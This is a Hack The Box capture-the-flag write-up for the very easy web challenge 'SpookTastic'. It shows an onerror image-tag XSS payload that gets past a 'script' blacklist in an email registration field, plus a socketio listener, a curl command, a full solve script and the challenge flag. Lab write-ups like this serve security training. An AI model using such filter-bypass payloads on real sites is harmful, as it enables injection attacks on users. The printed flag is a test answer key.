# HTB Challenges | SpookTastic - WEB (VERY EASY)

This challenge involved leveraging a XSS vulnerability in the email field which triggers a bot to emit the flag using socketio.

## Initial Analysis
Looking through `app.py` we spot a few interesting things:
- In `blacklist_pass`, the keyword `script` is used as a blacklisted string
- The bot will emit the flag using `socketio`
- The endpoint `/api/register` will register a user and start the bot, which will call `send_flag` after clicking the alert box

Putting these pieces together, the plan is to leverage the XSS vulnerability to generate an alert box. Since `script` is being blacklisted, we can get around that by using any of the event handler attributes such as `onerror`. Finally we need to make sure that there is a listener for the emitted flag.

## Exploitation
First start a listener to connect and listen for the flag.

``` python
import socketio

sio = socketio.Client()

@sio.event
def connect():
    print('Connected to server')

@sio.on('flag')
def on_flag(data):
    print('Received flag:', data['flag'])

sio.connect('http://94.237.49.212:44715')

# Keep connection alive
sio.wait()
```

Next send the XSS payload by registering an email.

``` bash
$ curl http://94.237.49.212:44715/api/register \
    -X POST \
    -d '{"email": "<img src=\"#\" onerror=\"alert(0)\""}' \
    -H "Content-Type: application/json"

{"success":true}
```

Now check back with the socketio listener.

``` bash
$ python3 socket-listener

Connected to server
Received flag: HTB{al3rt5_c4n_4nd_w1l1_c4us3_jumpsc4r35!!}
```

## Solve Script

``` python
import socketio
import requests

HOST = '94.237.49.212:44715'
sio = socketio.Client()

@sio.event
def connect():
    print('Connected to server')

@sio.on('flag')
def on_flag(data):
    print('Received flag:', data['flag'])
    sio.disconnect()

def main():
    sio.connect(f'http://{HOST}')

    xss_payload = '<img src="#" onerror="alert(0)"'
    resp = requests.post(f'http://{HOST}/api/register', json={'email': xss_payload})

    sio.wait() # keep the connection alive

if __name__ == '__main__':
    main()
```